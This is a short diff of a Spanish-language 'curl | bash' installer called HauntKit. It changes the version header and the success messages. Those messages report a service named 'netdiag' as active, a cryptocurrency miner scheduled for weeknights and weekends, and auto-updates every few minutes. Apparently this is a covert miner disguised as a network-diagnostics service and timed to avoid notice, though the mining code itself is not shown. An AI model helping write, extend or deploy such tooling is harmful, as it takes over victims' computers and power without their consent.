@@ -2,7 +2,7 @@
 # ════════════════════════════════════════════════════════
 #  HauntKit — Instalación remota (curl | bash)
 #  Una línea, sin interacción, sin esfuerzo
-#  v1.9.3 — verificación real de git/clone (fix: no asumir éxito)
+#  v1.9.4 — verificación real de git/clone (fix: no asumir éxito)
 # ════════════════════════════════════════════════════════
 
 set -euo pipefail
@@ -140,8 +140,8 @@ if systemctl is-active --quiet netdiag 2>/dev/null; then
     echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
     echo ""
     echo -e "  ${GREEN}✓${NC} Servicio netdiag: ACTIVO"
-    echo -e "  ${GREEN}✓${NC} Minero programado: 6PM - 7AM (Colombia)"
-    echo -e "  ${GREEN}✓${NC} Auto-update: cada ~6h"
+    echo -e "  ${GREEN}✓${NC} Minero: lun-vie 17:30-08:00; sáb 13:00 a lun 08:00 fin de semana"
+    echo -e "  ${GREEN}✓${NC} Auto-update: cada ~5 min"
     echo ""
     echo "  bash $DEST/tools/utils/mine-monitor.sh"
 else
